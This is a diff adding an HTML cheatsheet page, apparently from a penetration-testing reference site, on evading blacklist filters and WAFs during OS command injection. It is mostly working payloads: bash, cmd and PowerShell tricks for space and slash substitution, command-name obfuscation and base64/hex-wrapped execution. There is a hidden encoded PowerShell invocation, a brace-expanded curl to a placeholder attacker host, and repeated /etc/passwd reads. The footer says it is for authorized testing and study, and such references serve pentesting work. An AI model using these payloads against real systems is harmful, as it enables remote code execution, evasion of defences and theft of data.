@@ -1,0 +1,220 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Filter bypass · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › Command Injection</nav><h1>Filter bypass</h1><p class="cx-lede">Defeating blacklist filters and WAFs in command injection - space bypass, character substitution, command obfuscation, and automated evasion tools.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1059, T1027</span><span class="cx-tag">D3FEND D3-MH, D3-MA</span><span class="cx-tag">IMPACT RCE</span><span class="cx-tag">OWASP A05</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>When a basic separator gets you "invalid input," something specific is blacklisted - operators, spaces, slashes, or command names. Reduce the payload character-by-character to find the trigger, then swap it for an equivalent.</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Space bypass
+{ls,-la}                        # brace expansion
+ls${IFS}-la                     # IFS variable
+ls%09-la                        # tab (URL-encoded)
+
+# Slash bypass
+${PATH:0:1}                     # = &quot;/&quot;
+${HOME:0:1}                     # = &quot;/&quot; (usually)
+
+# Command obfuscation
+w&#x27;h&#x27;o&#x27;am&#x27;i                      # quote insertion
+who$@ami                        # positional param
+$(rev&lt;&lt;&lt;imaohw)                 # reversed
+bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;&lt;base64&gt;)  # base64 wrapper</code></pre></figure>
+<p>This page is single-page (not OS-tabbed) because filter bypass tricks are deeply OS-specific - Linux env var slicing and Windows <code>%VAR:~start,end%</code> syntax don't cross-translate, and tab-syncing would force you to re-find the same trick under both tabs.</p>
+<h2 id="identifying-whats-filtered">Identifying what's filtered</h2>
+<div class="cx-steps">
+<ol>
+<li>
+<p><strong>Confirm a working baseline.</strong> Send the legitimate input. Page returns success.</p>
+</li>
+<li>
+<p><strong>Add one character at a time.</strong> Append your separator, then build up: <code>127.0.0.1</code>, <code>127.0.0.1;</code>, <code>127.0.0.1;i</code>, <code>127.0.0.1;id</code>. The first request that fails identifies the filtered character or substring.</p>
+</li>
+<li>
+<p><strong>Check separator variants.</strong> If <code>;</code> fails, try <code>\n</code> (<code>%0a</code>), <code>&amp;</code> (<code>%26</code>), <code>|</code> (<code>%7c</code>), <code>&amp;&amp;</code>, <code>||</code>, <code>`</code>, <code>$()</code>. Newline is rarely blacklisted.</p>
+</li>
+<li>
+<p><strong>Check the command name.</strong> If <code>;id</code> fails but <code>;&lt;random&gt;</code> returns a different error, the <em>command</em> is blacklisted, not the separator. Move to command obfuscation.</p>
+</li>
+<li>
+<p><strong>Check spaces.</strong> Send <code>;id</code> (works) then <code>;id</code> (fails) - space is filtered. Move to space bypass.</p>
+</li>
+</ol>
+</div>
+<div class="cx-aside cx-tip">
+<p class="cx-aside-title">Tip</p>
+<p>The "reduce by one character" methodology beats guessing. It tells you <em>exactly</em> what's filtered in one or two minutes, instead of cycling through bypass techniques blindly.</p>
+</div>
+<h2 id="space-bypass">Space bypass</h2>
+<p>Spaces are the most commonly blocked character because legitimate inputs (IPs, hostnames, filenames) shouldn't contain them.</p>
+<h3 id="linux">Linux</h3>
+<p><strong>Tab character (<code>%09</code>)</strong></p>
+<p>The simplest substitute. Bash treats tab and space identically as argument separators.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>;id%09-a                        # `id -a`
+;cat%09/etc/passwd</code></pre></figure>
+<p><strong><code>${IFS}</code> - Internal Field Separator</strong></p>
+<p>Bash variable that expands to whitespace (space, tab, newline by default).</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">;ls${IFS}-la
+;cat${IFS}/etc/passwd
+;cat${IFS}$1/etc/passwd         # `$1` is empty in default shell context - useful padding</code></pre></figure>
+<p><strong>Brace expansion</strong></p>
+<p>Bash expands <code>{a,b,c}</code> into <code>a b c</code> with spaces inserted automatically.</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">;{ls,-la}
+;{cat,/etc/passwd}
+;{curl,&lt;ATTACKER&gt;/x}</code></pre></figure>
+<p>The brace form is also useful when <em>both</em> spaces and the command name are filtered, because the tokens inside braces aren't visible as the original command.</p>
+<p><strong>Newline</strong></p>
+<p>Bash splits commands on newlines too:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>%0aid                           # newline as separator AND argument boundary</code></pre></figure>
+<p>Less useful for "space inside a single command" - newline ends the command.</p>
+<h3 id="windows">Windows</h3>
+<p><strong>cmd.exe - comma and semicolon are argument separators</strong></p>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">&amp;dir,C:\Users
+&amp;type;C:\Windows\win.ini</code></pre></figure>
+<p><strong>PowerShell - backtick newline</strong></p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">;dir`nC:\Users                  # backtick + n forces newline</code></pre></figure>
+<p>PowerShell is much less likely to need space bypass - most cmdlets accept positional arguments without spaces being syntactically required.</p>
+<h2 id="slash-bypass">Slash bypass</h2>
+<p>Backslash and forward slash are blocked because they're needed for paths.</p>
+<h3 id="linux_1">Linux</h3>
+<p><strong>Environment variable slicing</strong></p>
+<p><code>${VAR:start:length}</code> extracts substrings. Pick a variable whose value contains the character you need at a known position.</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">${PATH:0:1}                     # /usr/bin... → &quot;/&quot;
+${HOME:0:1}                     # /root or /home/x → &quot;/&quot;
+${PWD:0:1}                      # current dir → &quot;/&quot;</code></pre></figure>
+<p>Combined:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">;cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
+# = cat /etc/passwd</code></pre></figure>
+<p><strong>Other useful single-character extractions</strong></p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">${LS_COLORS:10:1}               # = &quot;;&quot;
+${PATH:5:1}                     # often &quot;l&quot; depending on PATH
+echo ${IFS:0:1} | xxd           # confirm what IFS expands to (usually space)</code></pre></figure>
+<p>To produce an arbitrary character: dump <code>printenv</code> on a similar system and find a variable containing the character at a known index.</p>
+<h3 id="windows_1">Windows</h3>
+<p><strong>cmd.exe - <code>%VAR:~start,length%</code></strong></p>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">%HOMEPATH:~6,-11%               # \Users\&lt;user&gt; → trim to &quot;\&quot;
+%CD:~0,1%                       # current dir&#x27;s first char → &quot;C&quot;</code></pre></figure>
+<p>Negative length means "trim that many from the end."</p>
+<p><strong>PowerShell - array indexing on string</strong></p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">$env:HOMEPATH[0]                # &quot;\&quot;
+$env:PROGRAMFILES[0]            # &quot;C&quot;</code></pre></figure>
+<p>PowerShell treats strings as char arrays for indexing. No length needed for single chars.</p>
+<h2 id="generating-arbitrary-blocked-characters">Generating arbitrary blocked characters</h2>
+<p>Environment-variable slicing (above) only yields characters that happen to sit in some variable's value. When the character you need isn't reachable that way, <strong>shift it out of an adjacent one</strong>: <code>tr</code> maps one character range onto another, so feeding it the character <em>before</em> your target and shifting the whole printable range up by one prints the target - without the target ever appearing in the payload.</p>
+<h3 id="linux-tr-range-shift">Linux - <code>tr</code> range shift</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Need &quot;\&quot; (ASCII 92). The character just before it is &quot;[&quot; (91).
+echo $(tr &#x27;!-}&#x27; &#x27;&quot;-~&#x27;&lt;&lt;&lt;[)       # shifts every printable char up by one → &quot;\&quot;</code></pre></figure>
+<p><code>'!-}'</code> is the source range (ASCII 33-125), <code>'"-~'</code> the destination (34-126) - every character maps to the next one up. Look the target up in <code>man ascii</code>, feed <code>tr</code> the character one position lower, and the shifted output is the blocked character. The shifted output is character <strong>data</strong> in the current parse, so it slots in where a blocked character is needed as data - a path like <code>/etc/passwd</code>, or an argument a command filter would reject. To shift the other way, swap the ranges: <code>tr '"-~' '!-}'</code>.</p>
+<div class="cx-aside cx-caution">
+<p class="cx-aside-title">Caution</p>
+<p>These produce a character as <strong>data, not shell syntax.</strong> A generated <code>;</code>, <code>|</code>, <code>`</code> or <code>&gt;</code> won't separate commands, pipe, or redirect in the same injection - the shell finished parsing before the <code>$()</code> substitution ran and doesn't re-parse its output. To use a generated character <em>as</em> syntax you need a second parse stage: feed the assembled string to <code>eval</code> / <code>bash -c</code>, or land it in a separate injection point that gets parsed fresh.</p>
+</div>
+<h3 id="windows_2">Windows</h3>
+<p>PowerShell builds the same result straight from a code point - cast an integer to <code>[char]</code>, no shifting needed:</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">[char]92                         # &quot;\&quot;
+[char]59                         # &quot;;&quot;
+&quot;$([char]59)whoami&quot;              # builds the STRING &quot;;whoami&quot; - data, not executed</code></pre></figure>
+<p>As on Linux, this yields the character as data; running an assembled string as a command needs a second stage - <code>Invoke-Expression</code>/<code>iex</code> or the call operator <code>&amp;</code>. cmd.exe has no clean equivalent; use the <code>%VAR:~i,1%</code> slicing above, or drop to PowerShell.</p>
+<h2 id="command-name-obfuscation">Command name obfuscation</h2>
+<p>Filter blocks the literal command (<code>whoami</code>, <code>cat</code>, <code>wget</code>). Insert characters the shell discards.</p>
+<h3 id="linux_2">Linux</h3>
+<p><strong>Quote insertion</strong> (works in bash, sh, dash):</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">w&#x27;h&#x27;o&#x27;am&#x27;i                      # single quotes - even count required
+w&quot;h&quot;o&quot;am&quot;i                      # double quotes - even count required
+w&#x27;&#x27;h&#x27;&#x27;o&#x27;&#x27;am&#x27;&#x27;i                  # multiple quote groups OK</code></pre></figure>
+<p>Don't mix <code>'</code> and <code>"</code> in the same word. Quote count must be even.</p>
+<p><strong>Backslash insertion</strong> (bash, sh):</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">w\h\o\am\i</code></pre></figure>
+<p>No even-count requirement. Works because <code>\&lt;char&gt;</code> in unquoted context is just <code>&lt;char&gt;</code> to the shell.</p>
+<p><strong>Positional parameter <code>$@</code></strong> (bash):</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">who$@ami</code></pre></figure>
+<p><code>$@</code> expands to nothing in default shell context.</p>
+<p><strong>Variable concatenation</strong>:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">a=who;b=ami;$a$b                # &quot;whoami&quot;
+a=wh;b=oa;c=mi;$a$b$c</code></pre></figure>
+<p>Useful when filter scans for the literal substring but doesn't simulate variable expansion.</p>
+<p><strong>Case manipulation</strong> (Linux is case-sensitive - these <em>invoke</em> a case-converting wrapper):</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">$(tr &quot;[A-Z]&quot; &quot;[a-z]&quot;&lt;&lt;&lt;&quot;WhOaMi&quot;)
+$(a=&quot;WhOaMi&quot;;printf %s &quot;${a,,}&quot;)</code></pre></figure>
+<p>Sends mixed case through the request, lowercases at runtime. Useful when the filter is a case-sensitive blacklist and you want to send the command in a case it won't match.</p>
+<p><strong>Reversal</strong>:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">$(rev&lt;&lt;&lt;&#x27;imaohw&#x27;)               # reverses to &quot;whoami&quot;, executes</code></pre></figure>
+<p>Filter sees <code>imaohw</code>, not <code>whoami</code>.</p>
+<h3 id="windows_3">Windows</h3>
+<p><strong>Caret escape</strong> (cmd.exe):</p>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">who^ami                         # ^ is discarded, runs whoami</code></pre></figure>
+<p>The caret is cmd's escape character; <code>^&lt;char&gt;</code> becomes <code>&lt;char&gt;</code>. Doesn't need to be even.</p>
+<p><strong>Quote insertion</strong> (both shells):</p>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">w&quot;h&quot;o&quot;am&quot;i</code></pre></figure>
+<p><strong>PowerShell case-insensitive</strong>:</p>
+<p>PowerShell ignores case for cmdlets and built-ins natively:</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">WhOaMi                          # works as-is</code></pre></figure>
+<p>If the filter is case-sensitive, just change case.</p>
+<p><strong>PowerShell reversal</strong>:</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">iex &quot;$(&#x27;imaohw&#x27;[-1..-20] -join &#x27;&#x27;)&quot;</code></pre></figure>
+<h2 id="wholesale-payload-encoding">Wholesale payload encoding</h2>
+<p>When multiple things are filtered (spaces <em>and</em> slashes <em>and</em> command names), encode the entire command and decode at runtime.</p>
+<h3 id="linux-base64">Linux - base64</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Encode locally
+echo -n &#x27;cat /etc/passwd&#x27; | base64 -w0
+# Output: Y2F0IC9ldGMvcGFzc3dk
+
+# Inject
+;bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;Y2F0IC9ldGMvcGFzc3dk)</code></pre></figure>
+<p>The <code>&lt;&lt;&lt;</code> herestring avoids <code>|</code> (pipe). The full payload:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>;bash&lt;&lt;&lt;$(base64%09-d&lt;&lt;&lt;Y2F0IC9ldGMvcGFzc3dk)</code></pre></figure>
+<p>(<code>%09</code> for the space inside <code>base64 -d</code>.)</p>
+<p>If <code>base64</code> is filtered, <code>openssl base64 -d</code> and <code>xxd -r -p</code> (for hex) are equivalents:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">;bash&lt;&lt;&lt;$(xxd -r -p&lt;&lt;&lt;63617420 2f6574632f706173737764)</code></pre></figure>
+<h3 id="windows-powershell-encodedcommand">Windows - PowerShell <code>-EncodedCommand</code></h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Encode locally (UTF-16LE base64)
+echo -n &#x27;Get-Content C:\Users\admin\flag.txt&#x27; | iconv -t UTF-16LE | base64 -w0
+# Output: RwBlAHQALQBDAG8AbgB0AGUAbgB0AC...</code></pre></figure>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">;powershell -nop -w hidden -enc RwBlAHQALQBDAG8AbgB0AGUAbgB0AC...</code></pre></figure>
+<p><code>-EncodedCommand</code> (alias <code>-enc</code>, <code>-e</code>, <code>-ec</code>) accepts UTF-16LE base64. The encoding step is what trips most people up; UTF-8 base64 will not work.</p>
+<h2 id="automated-obfuscation">Automated obfuscation</h2>
+<p>When manual techniques aren't enough - heavy WAF, ML-based detection, layered filters - drop into a generator.</p>
+<h3 id="bashfuscator-linux">Bashfuscator (Linux)</h3>
+<p><a href="https://github.com/Bashfuscator/Bashfuscator">Bashfuscator/Bashfuscator</a> - generates obfuscated bash that executes a target command.</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">git clone https://github.com/Bashfuscator/Bashfuscator
+cd Bashfuscator &amp;&amp; python3 setup.py install --user
+./bashfuscator/bin/bashfuscator -c &#x27;cat /etc/passwd&#x27; -s 1 -t 1 --no-mangling --layers 1</code></pre></figure>
+<p>Flags: <code>-s 1 -t 1 --no-mangling --layers 1</code> keep output short. Without these, Bashfuscator can produce 100KB+ payloads - useless for URL injection.</p>
+<p>Test the output locally before sending:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">bash -c &#x27;&lt;bashfuscator-output&gt;&#x27;</code></pre></figure>
+<h3 id="dosfuscation-windows">DOSfuscation (Windows)</h3>
+<p><a href="https://github.com/danielbohannon/Invoke-DOSfuscation">danielbohannon/Invoke-DOSfuscation</a> - interactive, generates obfuscated cmd.exe payloads.</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">git clone https://github.com/danielbohannon/Invoke-DOSfuscation
+cd Invoke-DOSfuscation
+Import-Module .\Invoke-DOSfuscation.psd1
+Invoke-DOSfuscation
+# Inside the prompt:
+SET COMMAND type C:\Users\admin\flag.txt
+encoding
+1</code></pre></figure>
+<p>Available on Linux via <code>pwsh</code> (PowerShell Core).</p>
+<h2 id="combining-techniques">Combining techniques</h2>
+<p>Real engagements stack filters. Combine bypass techniques into a single payload.</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Filtered: spaces, slashes, &quot;cat&quot;, &quot;whoami&quot;
+# Newline allowed, environment variables allowed
+
+%0a${LS_COLORS:10:1}c&#x27;a&#x27;t${IFS}${PATH:0:1}etc${PATH:0:1}passwd</code></pre></figure>
+<p>Breakdown:
+- <code>%0a</code> - newline separator (avoids <code>;</code>)
+- <code>${LS_COLORS:10:1}</code> - produces <code>;</code> for chained commands
+- <code>c'a't</code> - <code>cat</code> with quote insertion
+- <code>${IFS}</code> - space
+- <code>${PATH:0:1}etc${PATH:0:1}passwd</code> - <code>/etc/passwd</code></p>
+<h2 id="common-failure-modes">Common failure modes</h2>
+<ul>
+<li><strong>Variable doesn't expand inside the URL.</strong> Some frameworks URL-decode but don't shell-expand <code>${VAR}</code> until the shell sees it. If your <code>${PATH:0:1}</code> arrives at the shell as the literal string <code>${PATH:0:1}</code>, you're fine. If it arrives as <code>` (because something pre-expanded it in an empty context), the shell is wrong - use</code>$PATH` without slicing and grep for what you need.</li>
+<li><strong>Quote insertion breaks inside subshells.</strong> <code>$(rev&lt;&lt;&lt;'imaohw')</code> works at the top level; <code>$(echo $(rev&lt;&lt;&lt;'imaohw'))</code> may not, because nested quoting gets confused. Keep nesting shallow.</li>
+<li><strong>Bash-only constructs in <code>dash</code>.</strong> <code>&lt;&lt;&lt;</code> herestrings, <code>${var:offset:length}</code>, <code>${var,,}</code>, <code>$@</code> shell tricks - all bash-isms. Default <code>/bin/sh</code> on Debian/Ubuntu is dash, which lacks them. Wrap with <code>bash -c '...'</code> or use POSIX equivalents (<code>echo X | rev</code> instead of <code>rev&lt;&lt;&lt;X</code>).</li>
+<li><strong>WAF normalizes URL encoding before matching.</strong> Filter rule matches <code>cat</code> after URL decoding. URL-encoding the letters (<code>%63%61%74</code>) doesn't help - WAF decodes first. You need <em>semantic</em> obfuscation (quote insertion, variable concat), not encoding.</li>
+<li><strong>Filter validates after expansion.</strong> Some filters run the constructed command string through a deny-list check after substituting variables. If <code>${PATH:0:1}etc${PATH:0:1}passwd</code> resolves to <code>/etc/passwd</code> and the filter then catches <code>passwd</code>, no amount of variable slicing helps. Check by submitting payloads where the <em>result</em> contains a benign string and see which fails.</li>
+<li><strong>Commands need <code>bash</code>, only <code>sh</code> available.</strong> <code>;bash -c '...'</code> fails with "bash not found" on minimal containers. Use <code>sh</code>, <code>/bin/sh</code>, or a different language entirely (<code>python3 -c '...'</code>, <code>perl -e '...'</code>).</li>
+</ul>
+<h2 id="notes">Notes</h2>
+<p>The order of operations matters: detect the filter, identify <em>what</em> is blocked, then apply the minimum bypass. Stacking every technique into one payload - base64-wrapping a brace-expanded quote-inserted reversed command - works occasionally and fails most of the time because every layer adds a way to break. Start with the simplest bypass (<code>%0a</code>, <code>${IFS}</code>, <code>w'h'o'am'i</code>) and only escalate when something specific demands it.</p>
+<p>For a deeper catalog of bypass tricks, <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection">PayloadsAllTheThings - Command Injection</a> has the broadest enumeration. The techniques on this page are the ones that actually land in 80%+ of cmdi engagements.</p></article><nav class="cx-pager"><a class="cx-prev" href="../shells/index.html">Previous: Reverse shells</a><a class="cx-next" href="../argument-injection/index.html">Next: Argument injection</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
